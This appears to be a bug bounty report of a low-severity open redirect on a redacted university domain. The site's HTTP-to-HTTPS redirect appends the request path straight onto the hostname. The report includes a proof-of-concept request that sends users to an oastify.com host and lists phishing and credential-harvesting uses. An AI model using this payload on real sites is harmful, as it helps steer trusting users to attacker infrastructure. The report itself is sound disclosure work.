Open Redirect via HTTP to HTTPS Redirection

BOUNTY-DEX Vulnerability Report

Type: Open Redirect / URL Manipulation

LOW

Summary

The affected application performs an automatic HTTP-to-HTTPS redirection and reflects user-controlled path content into the redirect target. By crafting a path that appends an attacker-controlled domain suffix, the application returns a 301 response redirecting users to a malicious external domain.

Technical Details

A normal request to a path like /a returns a redirect where path data is appended to the target URL.

Request:

GET /a HTTP/1.1
Host: XX.redacted.es

Response:

HTTP/1.1 301 Moved Permanently
Location: https://XX.redacted.esa

This behavior can be abused by injecting a crafted path that becomes part of the redirected hostname.

Proof of Concept

Request:

GET /.subdomain.oastify.com HTTP/1.1
Host: XX.redacted.es

Response:

HTTP/1.1 301 Moved Permanently
Location: https://XX.redacted.es.subdomain.oastify.com

Requests to the redirected URL reached the attacker-controlled server, confirming exploitability.

Impact

  • Can be used in phishing campaigns to redirect users from a trusted university domain to attacker infrastructure.
  • Improves credibility of malicious links by preserving a trusted prefix in the hostname.
  • Can assist credential harvesting or malware delivery through user confusion.
